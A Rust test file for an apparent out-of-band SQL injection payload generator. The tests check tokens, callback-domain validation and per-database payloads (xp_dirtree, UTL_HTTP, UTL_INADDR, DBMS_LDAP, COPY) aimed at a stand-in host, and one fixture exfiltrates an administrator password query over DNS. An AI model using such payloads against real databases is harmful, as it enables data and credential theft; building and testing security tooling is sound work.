use super::*;

#[test]
fn token_is_dns_safe() {
    let t = new_token();
    assert!(t.starts_with("oob"), "token: {t}");
    assert!(t.len() == 15, "token len: {t}");
    assert!(
        t.chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit())
    );
    assert_eq!(sanitize_dns_label(&t), t);
}

#[test]
fn token_uniqueness() {
    let a = new_token();
    let b = new_token();
    assert_ne!(a, b);
}

#[test]
fn sanitize_maps_invalid() {
    assert_eq!(sanitize_dns_label("ABC_def.ghi!"), "abc-def-ghi");
    assert_eq!(sanitize_dns_label("---"), "oob");
    assert_eq!(sanitize_dns_label(""), "oob");
}

#[test]
fn sanitize_truncates_63() {
    let long = "a".repeat(100);
    assert_eq!(sanitize_dns_label(&long).len(), 63);
}

#[test]
fn subdomain_builds() {
    assert_eq!(
        build_subdomain("oobabc123", "Collab.Example.COM."),
        "oobabc123.collab.example.com"
    );
}

#[test]
fn domain_validation() {
    assert!(is_valid_oob_domain("x.oastify.com"));
    assert!(is_valid_oob_domain("collab.example.com."));
    assert!(!is_valid_oob_domain(""));
    assert!(!is_valid_oob_domain("localhost"));
    assert!(!is_valid_oob_domain("http://evil.com"));
    assert!(!is_valid_oob_domain("a b.com"));
    assert!(!is_valid_oob_domain("-bad.example.com"));
    assert!(!is_valid_oob_domain("bad_.example.com"));
}

#[test]
fn mysql_payload_embeds_fqdn() {
    let v = oob_payloads_for(Some("mysql"), "c.example.com", "oobtok123");
    assert!(!v.is_empty());
    for p in &v {
        assert!(
            p.payload.contains("oobtok123.c.example.com"),
            "got {}",
            p.payload
        );
        assert!(p.payload.contains("-- -"), "mysql comment: {}", p.payload);
        assert_eq!(p.channel, OobChannel::Dns);
    }
}

#[test]
fn postgres_has_dns_and_http() {
    let v = oob_payloads_for(Some("postgres"), "c.example.com", "oobt1");
    assert!(v.iter().any(|p| p.channel == OobChannel::Dns));
    assert!(v.iter().any(|p| p.channel == OobChannel::Http));
    assert!(v.iter().any(|p| p.payload.contains("COPY")));
}

#[test]
fn mssql_primary_is_xp_dirtree() {
    let v = oob_payloads_for(Some("mssql"), "c.example.com", "oobt2");
    assert!(v[0].payload.contains("xp_dirtree"));
    assert!(v[0].payload.contains("oobt2.c.example.com"));
}

#[test]
fn oracle_covers_three_vectors() {
    let v = oob_payloads_for(Some("oracle"), "c.example.com", "oobt3");
    let joined = v
        .iter()
        .map(|p| p.payload.as_str())
        .collect::<Vec<_>>()
        .join("\n");
    assert!(joined.contains("UTL_INADDR"), "missing UTL_INADDR");
    assert!(joined.contains("UTL_HTTP"), "missing UTL_HTTP");
    assert!(joined.contains("DBMS_LDAP"), "missing DBMS_LDAP");
}

#[test]
fn generic_falls_back_to_three() {
    let v = oob_payloads_for(None, "c.example.com", "oobt4");
    assert_eq!(v.len(), 3);
    for p in &v {
        assert_eq!(p.dbms, "generic");
    }
}

#[test]
fn exfil_embeds_select_expr() {
    let expr = "(SELECT password FROM users WHERE username='administrator')";
    let v = oob_exfil_payloads_for(Some("mssql"), "c.example.com", "oobex1", expr);
    assert!(v[0].payload.contains(expr));
    assert!(v[0].payload.contains("oobex1.c.example.com"));
    let o = oob_exfil_payloads_for(Some("oracle"), "c.example.com", "oobex2", expr);
    assert!(o[0].payload.contains(expr));
}

#[test]
fn dns_encode_and_chunk() {
    assert_eq!(encode_for_dns("AB"), "4142");
    let chunks = chunk_for_dns("41424344", 2);
    assert_eq!(chunks, vec!["41", "42", "43", "44"]);
    assert_eq!(chunk_for_dns("", 32), [] as [String; 0]);
    assert_eq!(chunk_for_dns("aa", 0), [] as [String; 0]);
}
